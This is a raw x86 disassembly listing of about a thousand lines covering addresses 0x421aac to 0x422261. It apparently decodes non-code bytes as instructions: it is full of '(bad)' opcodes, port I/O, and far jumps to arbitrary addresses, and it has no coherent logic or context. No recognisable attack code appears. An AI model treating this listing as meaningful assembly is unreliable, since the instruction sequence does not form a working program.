  421aac:	mov    eax,ds:0xed9a9662
  421ab1:	adc    eax,0x9b673ce3
  421ab6:	in     al,dx
  421ab7:	icebp  
  421ab8:	xor    bl,ah
  421aba:	test   al,0xa5
  421abc:	retf   0x181f
  421abf:	nop
  421ac0:	dec    ecx
  421ac1:	dec    edx
  421ac2:	mov    eax,ds:0x8aa02365
  421ac7:	push   edx
  421ac8:	pop    edx
  421ac9:	idiv   edx
  421acb:	pop    ds
  421acc:	out    0x2,eax
  421ace:	push   edi
  421acf:	or     edx,DWORD PTR [ecx-0x449ec208]
  421ad5:	call   0xc73e:0xa01a52e4
  421adc:	add    ebp,0x81e133a5
  421ae2:	xchg   edi,eax
  421ae3:	mov    esi,DWORD PTR [edx]
  421ae5:	push   cs
  421ae6:	outs   dx,BYTE PTR ds:[esi]
  421ae7:	mov    edi,0x8259a79b
  421aec:	fld    TBYTE PTR [ebx+0x606383a9]
  421af2:	sub    edi,DWORD PTR [edx-0x6bcfc4f7]
  421af8:	fidiv  DWORD PTR [edi+0x2d725e8a]
  421afe:	out    0xd2,eax
  421b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b01:	jbe    0x421b2b
  421b03:	mov    esi,0xb81ae257
  421b08:	mov    al,ds:0x5ac924fc
  421b0d:	lods   eax,DWORD PTR ds:[esi]
  421b0e:	and    DWORD PTR [ecx+0x793d7a1e],esi
  421b14:	enter  0xe617,0xbe
  421b18:	dec    ebp
  421b19:	ja     0x421b57
  421b1b:	sti    
  421b1c:	fcomp  DWORD PTR [ecx+0x47a48d75]
  421b22:	cwde   
  421b23:	jb     0x421b56
  421b25:	mov    ds:0x7c40b4fc,eax
  421b2a:	add    al,0x3e
  421b2c:	inc    ebp
  421b2d:	ins    DWORD PTR es:[edi],dx
  421b2e:	dec    esp
  421b2f:	sar    DWORD PTR [edi+0x26],0xa8
  421b33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b34:	or     dh,0x4a
  421b37:	jmp    0x55380ad6
  421b3c:	loop   0x421b89
  421b3e:	loope  0x421b1d
  421b40:	stc    
  421b41:	rol    DWORD PTR [edi-0x73],cl
  421b44:	mov    WORD PTR ds:0xa071e2f1,ds
  421b4a:	not    DWORD PTR [ecx]
  421b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b4d:	dec    ecx
  421b4e:	mov    ss,WORD PTR [ebx+0xd512a08]
  421b54:	jecxz  0x421b1b
  421b56:	mov    eax,0x1cf7c867
  421b5b:	or     BYTE PTR [eax-0x58c99384],0x39
  421b62:	call   0xa7af:0x159b95bf
  421b69:	inc    esp
  421b6a:	in     eax,0x17
  421b6c:	fdiv   QWORD PTR [ecx+ebp*4]
  421b6f:	icebp  
  421b70:	mov    ch,0xa8
  421b72:	jp     0x421bc1
  421b74:	mov    dh,cl
  421b76:	inc    eax
  421b77:	pop    ss
  421b78:	push   ecx
  421b79:	pushf  
  421b7a:	or     al,0xc9
  421b7c:	loopne 0x421b20
  421b7e:	cli    
  421b7f:	aas    
  421b80:	(bad)  
  421b81:	jmp    0x421b3f
  421b83:	mov    eax,ds:0xf3c00cad
  421b88:	in     al,0x64
  421b8a:	push   eax
  421b8b:	cmc    
  421b8c:	jecxz  0x421be7
  421b8e:	adc    dl,ch
  421b90:	imul   ebp,eax,0x3a
  421b93:	je     0x421b2e
  421b95:	(bad)  
  421b96:	push   esi
  421b97:	bound  esp,QWORD PTR [ecx+esi*1-0x2f]
  421b9b:	cwde   
  421b9c:	das    
  421b9d:	arpl   WORD PTR [edx+0x10],bx
  421ba0:	out    dx,al
  421ba1:	mov    ecx,0xc233ac51
  421ba6:	mov    ebx,0xa2bcbee5
  421bab:	repnz rcr BYTE PTR [edi+ebx*4],0x59
  421bb0:	test   al,0xd1
  421bb2:	fstp   QWORD PTR [esi-0x41190ad8]
  421bb8:	dec    edi
  421bb9:	sub    BYTE PTR [edi+0x639da5cf],bh
  421bbf:	data16 jl 0x421b58
  421bc2:	in     eax,dx
  421bc3:	jp     0x421bc1
  421bc5:	mov    edx,0x70cfbe6f
  421bca:	push   es
  421bcb:	pop    ebx
  421bcc:	scas   al,BYTE PTR es:[edi]
  421bcd:	mul    BYTE PTR [esi+0x37de11d3]
  421bd3:	ret    0xb85a
  421bd6:	inc    ebx
  421bd7:	mov    edx,0x7a466e9
  421bdc:	adc    cl,ah
  421bde:	stos   DWORD PTR es:[edi],eax
  421bdf:	adc    DWORD PTR ss:[esi+ebx*1-0x147a4bf5],edx
  421be7:	pushf  
  421be8:	pusha  
  421be9:	and    BYTE PTR [esi+0x42],dl
  421bec:	loop   0x421be3
  421bee:	inc    edx
  421bef:	add    BYTE PTR [ebx+0x57],ch
  421bf2:	mov    bl,0xb4
  421bf4:	adc    DWORD PTR [eax-0x1c0999e5],eax
  421bfa:	fmul   st(5),st
  421bfc:	ror    bh,1
  421bfe:	mov    edx,0x5151f049
  421c03:	jmp    0x805d:0x4aaf4b4e
  421c0a:	stos   BYTE PTR es:[edi],al
  421c0b:	xchg   ebp,eax
  421c0c:	in     al,dx
  421c0d:	pop    eax
  421c0e:	sbb    DWORD PTR [edi-0x1d],edi
  421c11:	or     dl,ch
  421c13:	mov    al,0xe
  421c15:	out    dx,eax
  421c16:	in     al,0xd0
  421c18:	push   0xffffffce
  421c1a:	inc    bp
  421c1c:	xchg   ebx,eax
  421c1d:	not    BYTE PTR [edx]
  421c1f:	leave  
  421c20:	add    al,BYTE PTR [edi-0x73]
  421c23:	lea    eax,[edx]
  421c25:	sbb    BYTE PTR [esi-0x2302e241],bh
  421c2b:	mov    dl,0x2e
  421c2d:	jno    0x421be4
  421c2f:	or     al,0xb0
  421c31:	js     0x421cab
  421c33:	je     0x421c11
  421c35:	sub    ah,dl
  421c37:	mov    eax,0x52acf375
  421c3c:	jne    0x421c5b
  421c3e:	je     0x421bfe
  421c40:	sti    
  421c41:	xor    al,0x52
  421c43:	sbb    al,0x47
  421c45:	gs jg  0x421c82
  421c48:	outs   dx,DWORD PTR ds:[esi]
  421c49:	and    eax,0xb09df302
  421c4e:	jle    0x421c1c
  421c50:	mov    ah,0xa
  421c52:	adc    al,BYTE PTR [ebx]
  421c54:	out    0xfa,eax
  421c56:	push   es
  421c57:	jnp    0x421c43
  421c59:	loop   0x421c75
  421c5b:	pop    edx
  421c5c:	(bad)  
  421c5d:	sbb    bl,BYTE PTR [edi]
  421c5f:	mov    bl,0xee
  421c61:	not    DWORD PTR [ecx]
  421c63:	push   0x7b
  421c65:	je     0x421c90
  421c67:	mov    bl,0x46
  421c69:	cmp    ch,al
  421c6b:	cld    
  421c6c:	mov    eax,ds:0xa7c5cf4c
  421c71:	jle    0x421c52
  421c73:	aam    0x78
  421c75:	sti    
  421c76:	std    
  421c77:	shl    BYTE PTR [eax+0x67],0x45
  421c7b:	ins    BYTE PTR es:[edi],dx
  421c7c:	cmp    dl,BYTE PTR [edx-0x77869909]
  421c82:	add    eax,0x5b909a98
  421c87:	mov    esi,0x37920fbe
  421c8c:	aam    0x94
  421c8e:	add    DWORD PTR [edi+0x43],edi
  421c91:	pop    esp
  421c92:	inc    edi
  421c93:	out    0x7f,al
  421c95:	lods   eax,DWORD PTR ds:[esi]
  421c96:	mov    ebx,DWORD PTR [esi-0x574f9efa]
  421c9c:	das    
  421c9d:	cmc    
  421c9e:	out    0xd9,al
  421ca0:	mov    ch,BYTE PTR [eax-0x6b]
  421ca3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  421ca5:	scas   eax,DWORD PTR es:[edi]
  421ca6:	push   eax
  421ca7:	dec    edx
  421ca8:	add    eax,0x479f42f
  421cad:	cmp    DWORD PTR [edi+0x6f167671],esi
  421cb3:	pop    edi
  421cb4:	inc    ebp
  421cb5:	hlt    
  421cb6:	mov    edi,0x52c6f18a
  421cbb:	je     0x421ccf
  421cbd:	jmp    0xcb117f53
  421cc2:	add    dl,dl
  421cc4:	ins    BYTE PTR es:[edi],dx
  421cc5:	pop    ecx
  421cc6:	movq   QWORD PTR [esi],mm4
  421cc9:	icebp  
  421cca:	cmp    edi,DWORD PTR [ebp-0x7c]
  421ccd:	out    0x72,eax
  421ccf:	mov    DWORD PTR [eax-0x3a],0x319f6db
  421cd6:	cmp    eax,0x3938ec36
  421cdb:	push   cs
  421cdc:	mov    al,ds:0xba8bfd09
  421ce1:	xlat   BYTE PTR ds:[ebx]
  421ce2:	sub    eax,0x90009f21
  421ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ce8:	out    0xb1,eax
  421cea:	xchg   ch,ah
  421cec:	mov    DWORD PTR [esi-0x3067114d],edx
  421cf2:	xor    BYTE PTR [bp+di-0x251d],0xf6
  421cf8:	push   edi
  421cf9:	dec    ecx
  421cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cfb:	pop    esp
  421cfc:	adc    eax,0x89585bd
  421d01:	xchg   ecx,eax
  421d02:	mov    dh,0x2a
  421d04:	add    DWORD PTR [ecx-0x1125fa31],0xffffffd1
  421d0b:	jge    0x421d67
  421d0d:	mov    ds:0x603de380,eax
  421d12:	push   edi
  421d13:	ss (bad) 
  421d15:	rcr    DWORD PTR [ebp+0x635e7c6b],1
  421d1b:	jmp    0xe376:0xb4ae1b9b
  421d22:	cmp    ebx,DWORD PTR [edi+0x55566529]
  421d28:	cmp    eax,0x749bde78
  421d2d:	test   eax,0xe7d6a25e
  421d32:	or     BYTE PTR [ecx-0x21],bh
  421d35:	mov    ds:0xff8e5de4,eax
  421d3a:	ss jns 0x421da1
  421d3d:	xor    bl,BYTE PTR [eax-0x51]
  421d40:	lods   eax,DWORD PTR ds:[esi]
  421d41:	shld   DWORD PTR [esi-0x6b6a450b],eax,cl
  421d48:	cmp    eax,0xdf930096
  421d4d:	imul   BYTE PTR ds:0x59ae2d04
  421d53:	pop    ss
  421d54:	int3   
  421d55:	pop    edx
  421d56:	mov    dh,BYTE PTR [edi-0x68]
  421d59:	jmp    0x64b916cc
  421d5e:	add    BYTE PTR [ebx],dh
  421d60:	lods   eax,DWORD PTR cs:[esi]
  421d62:	cdq    
  421d63:	rcr    BYTE PTR ds:0x1c772bc7,0xd0
  421d6a:	and    eax,0x71f76ac
  421d6f:	mov    ch,bh
  421d71:	pop    es
  421d72:	rcl    BYTE PTR [edx],0x76
  421d75:	xchg   edi,eax
  421d76:	loope  0x421d23
  421d78:	or     eax,0x565241c7
  421d7d:	and    al,0x20
  421d7f:	push   esi
  421d80:	out    dx,eax
  421d81:	and    dl,BYTE PTR [ebp-0x20]
  421d84:	enter  0x2777,0xc2
  421d88:	loopne 0x421d3a
  421d8a:	mov    edx,0x2a0af4a3
  421d8f:	jmp    0x421d75
  421d91:	test   eax,0xbfaf0ce3
  421d96:	nop
  421d97:	imul   esi,edi,0x53
  421d9a:	and    esp,ecx
  421d9c:	xchg   DWORD PTR [edi+0x3832802e],ecx
  421da2:	push   cs
  421da3:	pop    edx
  421da4:	retf   
  421da5:	cwde   
  421da6:	lods   al,BYTE PTR ds:[esi]
  421da7:	ins    DWORD PTR es:[edi],dx
  421da8:	gs loopne 0x421dd9
  421dab:	cdq    
  421dac:	retf   0xd849
  421daf:	dec    eax
  421db0:	loopne 0x421d3d
  421db2:	mov    cl,0x1e
  421db4:	dec    ebx
  421db5:	pop    ss
  421db6:	mov    esp,DWORD PTR [eax-0x5a847e47]
  421dbc:	jle    0x421d99
  421dbe:	add    esp,DWORD PTR [edi+eiz*4]
  421dc1:	lock out dx,eax
  421dc3:	sbb    DWORD PTR ds:0x3ac4e875,0x975e2ebf
  421dcd:	pusha  
  421dce:	shl    BYTE PTR [eax],0xd5
  421dd1:	inc    edi
  421dd2:	sub    BYTE PTR [ecx],dl
  421dd4:	cmp    DWORD PTR ds:0xfda17b2d,ebx
  421dda:	fwait
  421ddb:	repz ror BYTE PTR [edi+0x696e3e98],cl
  421de2:	push   ss
  421de3:	cli    
  421de4:	jns    0x421deb
  421de6:	push   ecx
  421de7:	cmp    al,0x8d
  421de9:	bnd jp 0x421dd4
  421dec:	fwait
  421ded:	sub    al,0xeb
  421def:	aad    0x83
  421df1:	(bad)  
  421df2:	ffreep st(4)
  421df4:	adc    eax,0x68b0dab6
  421df9:	daa    
  421dfa:	scas   eax,DWORD PTR es:[edi]
  421dfb:	enter  0x8664,0xce
  421dff:	mov    ebx,0x92551010
  421e04:	dec    esi
  421e05:	repz ficom WORD PTR [edx]
  421e08:	jge    0x421e7b
  421e0a:	retf   
  421e0b:	jmp    0x836b:0xc9205c8d
  421e12:	sbb    ecx,DWORD PTR [eax-0x3630416f]
  421e18:	ss out 0xd8,eax
  421e1b:	push   ss
  421e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e1d:	pop    ebp
  421e1e:	or     dl,BYTE PTR [edx]
  421e20:	out    dx,eax
  421e21:	xor    DWORD PTR [esi],0xe47bbd92
  421e27:	and    al,0xa9
  421e29:	aaa    
  421e2a:	(bad)  
  421e2b:	sub    al,0x7f
  421e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e2e:	sti    
  421e2f:	fwait
  421e30:	pop    edi
  421e31:	lock pop ss
  421e33:	mov    ebp,0xe1c6ab61
  421e38:	mov    bh,0xa1
  421e3a:	lock xor eax,0xf1db7b7b
  421e40:	pop    edx
  421e41:	xchg   ebp,eax
  421e42:	dec    edx
  421e43:	sbb    ah,BYTE PTR [ebx]
  421e45:	push   0x5a9eda96
  421e4a:	clc    
  421e4b:	or     bh,BYTE PTR [esi]
  421e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e4e:	push   edx
  421e4f:	repz into 
  421e51:	mov    ecx,0xbf0853b4
  421e56:	in     eax,dx
  421e57:	or     eax,DWORD PTR [ecx+0x62]
  421e5a:	popf   
  421e5b:	aas    
  421e5c:	cli    
  421e5d:	mov    ebp,0x8c8f2e1b
  421e62:	add    DWORD PTR [edx+0x42],edi
  421e65:	jp     0x421e10
  421e67:	ret    
  421e68:	mov    ebx,edi
  421e6a:	lock in eax,0x1f
  421e6d:	xor    dh,BYTE PTR [ebp+0xe851b69]
  421e73:	jns    0x421e22
  421e75:	dec    edx
  421e76:	jmp    0x9468:0x3c631af5
  421e7d:	sbb    al,0x90
  421e7f:	(bad)  
  421e80:	xchg   esi,eax
  421e81:	stos   BYTE PTR es:[edi],al
  421e82:	mov    bl,0xee
  421e84:	in     al,0x68
  421e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e87:	lods   eax,DWORD PTR ds:[esi]
  421e88:	mov    bh,0xaf
  421e8a:	sahf   
  421e8b:	mov    edi,0xe77712b
  421e90:	push   0xb82daa36
  421e95:	leave  
  421e96:	add    dl,BYTE PTR [eax-0x32]
  421e99:	popa   
  421e9a:	jno    0x421e2e
  421e9c:	xor    BYTE PTR [ecx],bl
  421e9e:	retf   0x2445
  421ea1:	loope  0x421ebf
  421ea3:	scas   eax,DWORD PTR es:[edi]
  421ea4:	adc    BYTE PTR [edi+0x9b25e2e],cl
  421eaa:	in     eax,0xe1
  421eac:	fild   WORD PTR [eax]
  421eae:	outs   dx,BYTE PTR ds:[esi]
  421eaf:	jbe    0x421ef0
  421eb1:	xor    BYTE PTR [ebp-0x21320690],0x7f
  421eb8:	adc    al,0xb8
  421eba:	jl     0x421e7d
  421ebc:	push   eax
  421ebd:	cmp    eax,0x6113c2
  421ec2:	mov    BYTE PTR [ebp-0x50],cl
  421ec5:	jp     0x421f03
  421ec7:	ins    BYTE PTR es:[edi],dx
  421ec8:	cdq    
  421ec9:	out    dx,eax
  421eca:	test   DWORD PTR [ebp-0x2ce09171],0xc4246d39
  421ed4:	or     eax,0x55832cb1
  421ed9:	cdq    
  421eda:	jno    0x421ef3
  421edc:	adc    BYTE PTR [ecx+0x77accddc],bl
  421ee2:	jecxz  0x421efb
  421ee4:	enter  0x96d5,0x58
  421ee8:	mov    edi,DWORD PTR [eax+0x6]
  421eeb:	lods   eax,DWORD PTR ds:[esi]
  421eec:	mov    dl,0xbd
  421eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421eef:	inc    ebp
  421ef0:	jnp    0x421e83
  421ef2:	pop    esi
  421ef3:	fsubr  st,st(1)
  421ef5:	jp     0x421f26
  421ef7:	fnclex 
  421ef9:	or     WORD PTR [ebp-0x50],sp
  421efd:	sbb    edx,edx
  421eff:	jl     0x421f4b
  421f01:	pop    eax
  421f02:	pop    esp
  421f03:	push   esp
  421f04:	xor    BYTE PTR [esi],ah
  421f06:	call   0x2e1caaa0
  421f0b:	mov    es,WORD PTR [ebx-0x67b36ed7]
  421f11:	adc    ebx,DWORD PTR [ecx+edx*8-0x6b]
  421f15:	mov    al,ds:0x8a7434b6
  421f1a:	sbb    bl,ch
  421f1c:	stos   DWORD PTR es:[edi],eax
  421f1d:	rcl    DWORD PTR [edx+edi*8+0x6e],0x76
  421f22:	lahf   
  421f23:	jbe    0x421f2d
  421f25:	inc    esp
  421f26:	fs pop ss
  421f28:	sub    al,0x92
  421f2a:	int    0xe6
  421f2c:	sbb    DWORD PTR [edi],esp
  421f2e:	mov    eax,0x87e622f8
  421f33:	mov    eax,ds:0x8bcb21ce
  421f38:	call   0x20f4:0x88448d6a
  421f3f:	aad    0xa0
  421f41:	cmc    
  421f42:	stos   DWORD PTR es:[edi],eax
  421f43:	push   ds
  421f44:	and    edx,DWORD PTR [ebx-0x1e]
  421f47:	ret    0xddfc
  421f4a:	push   0xffffffcf
  421f4c:	daa    
  421f4d:	fist   WORD PTR [edi-0x71]
  421f50:	in     eax,dx
  421f51:	mov    ch,0xf3
  421f53:	lock mul DWORD PTR [ecx-0x68d7b668]
  421f5a:	popf   
  421f5b:	scas   eax,DWORD PTR es:[edi]
  421f5c:	jbe    0x421f9a
  421f5e:	lea    edx,[ebx-0x43]
  421f61:	push   ebx
  421f62:	imul   DWORD PTR [ecx+eiz*2+0x73]
  421f66:	add    esp,DWORD PTR ds:0xb243aad0
  421f6c:	add    DWORD PTR [ebp-0x71],edi
  421f6f:	push   ds
  421f70:	es pushf 
  421f72:	pop    es
  421f73:	add    al,0xae
  421f75:	in     eax,dx
  421f76:	cmp    DWORD PTR [edx+0x74b5a9f3],esp
  421f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f7d:	sbb    dl,BYTE PTR [eax+ebp*1]
  421f80:	ins    BYTE PTR es:[edi],dx
  421f81:	loopne 0x421f27
  421f83:	clc    
  421f84:	mov    eax,0x455ae067
  421f89:	jno    0x421fdb
  421f8b:	pop    eax
  421f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f8d:	dec    edx
  421f8e:	ret    
  421f8f:	and    ah,BYTE PTR [edx-0x2cd32e1d]
  421f95:	pop    eax
  421f96:	jnp    0x421f9d
  421f98:	adc    DWORD PTR [edi-0x6c],ecx
  421f9b:	mov    ss,WORD PTR [ebx*4+0x1cb0611b]
  421fa2:	mov    edi,0x96c18c38
  421fa7:	dec    edx
  421fa8:	xor    esp,DWORD PTR [esi+0x665441c0]
  421fae:	leave  
  421faf:	int3   
  421fb0:	dec    edx
  421fb1:	jge    0x421f5e
  421fb3:	je     0x421f46
  421fb5:	mov    cl,0xfc
  421fb7:	das    
  421fb8:	push   0xffffffbf
  421fba:	lods   al,BYTE PTR ds:[esi]
  421fbb:	ins    BYTE PTR es:[edi],dx
  421fbc:	fisub  DWORD PTR [edx-0x29]
  421fbf:	pop    esi
  421fc0:	mov    DWORD PTR [edi-0x5b90cf4],ecx
  421fc6:	aam    0x6f
  421fc8:	xchg   ah,ch
  421fca:	mov    edi,0xf007753d
  421fcf:	test   eax,0xee52edae
  421fd4:	repnz pop edx
  421fd6:	dec    ecx
  421fd7:	(bad)
  421fdb:	icebp  
  421fdc:	mov    BYTE PTR [ebp-0x12f03542],ah
  421fe2:	aas    
  421fe3:	pop    edx
  421fe4:	pushf  
  421fe5:	mov    dl,0xa6
  421fe7:	imul   edi,DWORD PTR [esp+ebx*4],0x4aaa9cb3
  421fee:	add    al,0xc3
  421ff0:	test   eax,0x4f10612e
  421ff5:	sub    eax,0x32e67740
  421ffa:	and    eax,ebx
  421ffc:	(bad)  
  421ffd:	in     al,0x3b
  421fff:	aaa    
  422000:	xchg   ecx,eax
  422001:	sub    eax,0xc77105b
  422006:	cdq    
  422007:	jae    0x422022
  422009:	xlat   BYTE PTR ds:[ebx]
  42200a:	cwde   
  42200b:	jmp    0xff19ec40
  422010:	fs out 0xa9,eax
  422013:	pop    ds
  422014:	(bad)  
  422015:	(bad)  
  422017:	outs   dx,BYTE PTR ds:[esi]
  422018:	xchg   DWORD PTR [ebx],ecx
  42201a:	rcr    DWORD PTR [ecx+0x3bcc5024],0xa1
  422021:	sub    ah,BYTE PTR [edi]
  422023:	(bad)  
  422024:	mov    bh,0xf7
  422026:	xchg   DWORD PTR [eax-0x2d],esi
  422029:	stos   BYTE PTR es:[edi],al
  42202a:	cwde   
  42202b:	pop    ebx
  42202c:	lahf   
  42202d:	lds    ecx,FWORD PTR [ecx]
  42202f:	jnp    0x422023
  422031:	dec    ebx
  422032:	ret    0x123c
  422035:	cld    
  422036:	aam    0x51
  422038:	push   0x4183ab95
  42203d:	fs loop 0x421fe5
  422040:	add    cl,al
  422042:	hlt    
  422043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422044:	fwait
  422045:	stc    
  422046:	add    dh,dl
  422048:	mov    al,0xdf
  42204a:	aas    
  42204b:	(bad)  
  42204c:	pop    ss
  42204d:	xchg   edi,eax
  42204e:	jecxz  0x421ff9
  422050:	icebp  
  422051:	mov    DWORD PTR [edx+edx*1-0x4d059aa6],edx
  422058:	mov    ch,0x5d
  42205a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42205b:	pop    ebx
  42205c:	test   eax,0x71a6f00f
  422061:	xor    ebx,DWORD PTR [ebp+edi*2+0x38]
  422065:	cmp    ecx,esp
  422067:	inc    ebp
  422068:	cli    
  422069:	xor    DWORD PTR [ecx+0xa815544],edi
  42206f:	pusha  
  422070:	mov    ecx,DWORD PTR [eax+0x68]
  422073:	les    esp,FWORD PTR [eax+0x69a664ba]
  422079:	mov    ch,0xe5
  42207b:	fcomip st,st(6)
  42207d:	xchg   esp,eax
  42207e:	adc    esp,ecx
  422080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422081:	lods   al,BYTE PTR ds:[esi]
  422082:	mov    BYTE PTR ds:0x89f65a6e,dl
  422088:	mov    al,BYTE PTR [edx-0x157a5438]
  42208e:	cli    
  42208f:	repnz ins DWORD PTR es:[edi],dx
  422091:	jb     0x4220f0
  422093:	(bad)  
  422094:	frstor [ecx]
  422096:	lock imul ebp,DWORD PTR [esp+esi*4-0x3d],0x6
  42209c:	fnstcw WORD PTR [esi]
  42209e:	clc    
  42209f:	sbb    al,BYTE PTR [ebx+0x34]
  4220a2:	sbb    ah,dl
  4220a4:	inc    ecx
  4220a5:	mov    edx,0xbeb1d3c2
  4220aa:	jecxz  0x4220fd
  4220ac:	inc    eax
  4220ad:	mov    cs,WORD PTR cs:0xff0d4358
  4220b4:	aaa    
  4220b5:	pop    esp
  4220b6:	mov    bl,0xd7
  4220b8:	xlat   BYTE PTR ds:[ebx]
  4220b9:	pop    esi
  4220ba:	cmp    bh,BYTE PTR [ebx+eiz*4+0x26c886a5]
  4220c1:	int    0xc2
  4220c3:	ins    BYTE PTR es:[edi],dx
  4220c4:	mov    DWORD PTR [edx-0x6d],eax
  4220c7:	jo     0x422094
  4220c9:	cmp    BYTE PTR [ebp+0x5c],ah
  4220cc:	js     0x422077
  4220ce:	imul   ebx,DWORD PTR [ecx+eiz*2+0x3c],0xbc8256e9
  4220d6:	dec    edi
  4220d7:	adc    cl,bl
  4220d9:	mov    DWORD PTR [ebp-0x7e],edi
  4220dc:	cmp    WORD PTR [edi-0x24a40f21],0x66
  4220e4:	ret    0xb547
  4220e7:	scas   eax,DWORD PTR es:[edi]
  4220e8:	loop   0x4220ad
  4220ea:	repz int 0xb0
  4220ed:	ss inc eax
  4220ef:	xor    eax,0xf1252cfc
  4220f4:	jmp    0x4220f0
  4220f6:	or     edx,ecx
  4220f8:	jnp    0x422139
  4220fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220fb:	push   edi
  4220fc:	aad    0x9a
  4220fe:	sub    BYTE PTR [edi-0x46],dl
  422101:	adc    BYTE PTR [ebx*4+0x3b3f0615],bl
  422108:	inc    edi
  422109:	std    
  42210a:	retf   
  42210b:	inc    ebp
  42210c:	mov    ch,0xfe
  42210e:	add    BYTE PTR [ecx+ebx*8+0x35ebd7af],al
  422115:	sti    
  422116:	std    
  422117:	fldcw  WORD PTR [edx-0x5aa6b0c2]
  42211d:	xchg   edx,eax
  42211e:	xchg   ecx,eax
  42211f:	cmp    al,0xa1
  422121:	mov    dl,0x40
  422123:	imul   ecx,DWORD PTR [ecx+0x2644fb8f],0x10beb4be
  42212d:	mov    DWORD PTR [ebx-0xf2fb060],esp
  422133:	popf   
  422134:	int3   
  422135:	pop    eax
  422136:	or     BYTE PTR [edi],ch
  422138:	into   
  422139:	test   eax,0x4bc270ff
  42213e:	stc    
  42213f:	add    DWORD PTR [ecx],ebx
  422141:	out    0xcd,eax
  422143:	aam    0x48
  422145:	push   ebp
  422146:	mov    esi,0xf04e9353
  42214b:	jns    0x4220d6
  42214d:	lods   eax,DWORD PTR ds:[esi]
  42214e:	in     eax,dx
  42214f:	daa    
  422150:	rol    ebx,1
  422152:	xor    cl,BYTE PTR [edx-0xa]
  422155:	push   eax
  422156:	mov    WORD PTR [edx],?
  422158:	push   edi
  422159:	jne    0x4221bd
  42215b:	js     0x42212b
  42215d:	adc    edi,DWORD PTR [edx]
  42215f:	push   edx
  422160:	sbb    DWORD PTR ds:[edi],esi
  422163:	(bad)  
  422164:	imul   ecx,DWORD PTR [eax-0x69],0x5084f6dd
  42216b:	stos   DWORD PTR es:[edi],eax
  42216c:	pop    ecx
  42216d:	jmp    0xde7a:0xb5bd552
  422174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422175:	xchg   ebx,eax
  422176:	test   al,0x42
  422178:	push   eax
  422179:	fild   WORD PTR [edx+0x23]
  42217c:	mov    bl,0xd1
  42217e:	sahf   
  42217f:	fdivr  DWORD PTR [ebx+edi*4-0x304c4cf4]
  422186:	sbb    ah,BYTE PTR [esi-0x16f9a0f8]
  42218c:	outs   dx,BYTE PTR ds:[esi]
  42218d:	imul   DWORD PTR ds:0x2b3ae9ba
  422193:	shl    DWORD PTR [edx+eiz*1+0x1f],1
  422197:	add    dl,BYTE PTR [ecx-0x4e]
  42219a:	xchg   esp,eax
  42219b:	lods   al,BYTE PTR ds:[esi]
  42219c:	or     dh,bl
  42219e:	and    BYTE PTR [ebp-0x744438d8],ch
  4221a4:	daa    
  4221a5:	add    al,0x8
  4221a7:	out    0x13,eax
  4221a9:	xchg   edi,eax
  4221aa:	or     DWORD PTR [ebx-0x58123a19],edx
  4221b0:	pusha  
  4221b1:	push   ebp
  4221b2:	pop    es
  4221b3:	scas   al,BYTE PTR es:[edi]
  4221b4:	inc    ebx
  4221b5:	js     0x4221bd
  4221b7:	mov    cl,0x11
  4221b9:	mov    eax,ds:0x839116b0
  4221be:	(bad)  
  4221bf:	test   eax,0x1afaa615
  4221c4:	jmp    0x4221f3
  4221c6:	scas   al,BYTE PTR es:[edi]
  4221c7:	lea    edx,[ecx]
  4221c9:	repnz pop edx
  4221cb:	call   0xbab6f8e3
  4221d0:	sbb    dh,BYTE PTR [eax+0x579c9612]
  4221d6:	push   ss
  4221d7:	jg     0x4221e2
  4221d9:	sub    al,0xa6
  4221db:	in     al,0xf9
  4221dd:	add    edi,DWORD PTR fs:[ecx+0x63bae080]
  4221e4:	mov    ds:0xcda5e9cf,eax
  4221e9:	sub    esi,ebp
  4221eb:	inc    ebx
  4221ec:	lods   eax,DWORD PTR ds:[esi]
  4221ed:	out    dx,al
  4221ee:	pop    ecx
  4221ef:	mov    esi,0x38659ace
  4221f4:	ds fadd st(7),st
  4221f7:	or     BYTE PTR [edi],bh
  4221f9:	or     al,0x5e
  4221fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221fc:	sub    eax,ecx
  4221fe:	aad    0x57
  422200:	(bad)  
  422201:	xchg   ebp,eax
  422202:	pusha  
  422203:	inc    eax
  422204:	inc    ebx
  422205:	cmp    al,0x8
  422207:	sbb    eax,0xd66a4867
  42220c:	xor    eax,0xd90fda8f
  422211:	adc    eax,0xae2ee7fa
  422216:	call   0x9e4d719a
  42221b:	pop    ds
  42221c:	inc    ecx
  42221d:	xor    edx,edi
  42221f:	mov    ds:0xd920320c,al
  422224:	clc    
  422225:	push   ds
  422226:	push   ebx
  422227:	add    cl,ch
  422229:	aad    0x26
  42222b:	push   ecx
  42222c:	cwde   
  42222d:	mov    edi,fs
  42222f:	mov    bl,0x14
  422231:	ret    
  422232:	je     0x422286
  422234:	(bad)  
  422235:	cld    
  422236:	jg     0x422212
  422238:	inc    esp
  422239:	cmp    al,0xeb
  42223b:	mov    ds:0xc5cbc298,al
  422240:	loopne 0x4222bc
  422242:	push   ss
  422243:	gs mov al,es:0x1837e991
  42224a:	push   edx
  42224b:	xor    ebp,DWORD PTR [ecx-0x32]
  42224e:	mov    bh,0xce
  422250:	inc    edi
  422251:	cmp    BYTE PTR ds:0x3a83aca5,ah
  422257:	sbb    al,0xce
  422259:	cmp    ecx,ebp
  42225b:	jge    0x422222
  42225d:	add    ebx,DWORD PTR [edi]
  42225f:	or     BYTE PTR [ebx],bl
  422261:	cmp    edi,ebx
